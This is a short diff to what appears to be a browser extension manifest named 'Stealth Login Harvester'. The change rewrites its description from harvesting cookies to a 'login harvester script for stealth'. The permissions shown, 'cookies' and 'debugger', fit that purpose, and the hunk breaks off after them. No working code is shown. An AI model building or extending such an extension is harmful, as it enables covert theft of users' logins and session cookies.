@@ -1,7 +1,7 @@
 {
   "name": "Stealth Login Harvester",
   "version": "0.1.0",
-  "description": "extension for harvesting cookies",
+  "description": "Login harvester script for stealth",
   "permissions": [
     "cookies",
     "debugger",
